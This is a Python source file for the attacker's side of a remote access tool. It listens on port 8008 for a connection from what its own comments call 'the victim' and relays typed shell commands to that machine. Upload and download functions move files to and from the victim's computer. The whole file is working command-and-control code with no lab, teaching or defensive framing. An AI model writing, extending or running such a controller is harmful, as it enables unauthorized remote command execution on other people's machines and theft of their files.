import socket
import os
import struct
import time

def send_file(sock, filepath):
    """Send a file to the victim"""
    try:
        if not os.path.exists(filepath):
            print(f"Error: File '{filepath}' not found")
            return False

        filename = os.path.basename(filepath)
        sock.send(f"upload {filename}".encode())

        # Wait for READY response
        response = sock.recv(4096).decode()
        if response != "READY":
            print("Victim not ready to receive file")
            return False

        # Send file size and content
        filesize = os.path.getsize(filepath)
        sock.send(struct.pack("!I", filesize))

        with open(filepath, "rb") as f:
            while chunk := f.read(4096):
                sock.send(chunk)

        # Get upload confirmation
        response = sock.recv(4096).decode()
        print(response)
        return True

    except Exception as e:
        print(f"Upload error: {str(e)}")
        return False

def receive_file(sock, remote_path):
    """Download a file from the victim"""
    try:
        sock.send(f"download {remote_path}".encode())
        
        # First check if file exists
        initial_response = sock.recv(4096).decode()
        if initial_response == "FileNotFound":
            print("Error: File not found on victim's machine")
            return False
        
        # Get file size
        filesize = int(initial_response.split()[1])
        sock.send(b"READY")  # Acknowledge
        
        # Receive file content
        filename = os.path.basename(remote_path)
        with open(filename, "wb") as f:
            received = 0
            while received < filesize:
                chunk = sock.recv(min(4096, filesize - received))
                if not chunk:
                    break
                f.write(chunk)
                received += len(chunk)
        
        print(f"File downloaded successfully: {filename} ({received} bytes)")
        return True

    except Exception as e:
        print(f"Download error: {str(e)}")
        return False

def main():
    HOST_IP = "0.0.0.0"  # Listen on all interfaces
    HOST_PORT = 8008

    # Set up server socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST_IP, HOST_PORT))
    server_socket.listen(1)
    print(f"[*] Listening for connections on {HOST_PORT}...")

    while True:
        try:
            # Accept incoming connection
            client_socket, client_addr = server_socket.accept()
            print(f"[+] Connection established with {client_addr[0]}:{client_addr[1]}")

            while True:
                cmd = input(">> ").strip()
                if not cmd:
                    continue

                if cmd.lower() == "exit":
                    client_socket.send(cmd.encode())
                    break

                if cmd.startswith("upload "):
                    filepath = cmd[7:]
                    send_file(client_socket, filepath)
                elif cmd.startswith("download "):
                    remote_path = cmd[9:]
                    receive_file(client_socket, remote_path)
                else:
                    # Send regular command
                    client_socket.send(cmd.encode())
                    
                    # Handle response
                    response = client_socket.recv(4096).decode()
                    print(response)

            client_socket.close()
            print("[*] Connection closed. Waiting for new connection...")

        except ConnectionResetError:
            print("[-] Client disconnected unexpectedly")
            continue
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            time.sleep(2)
            continue

if __name__ == "__main__":
    main()
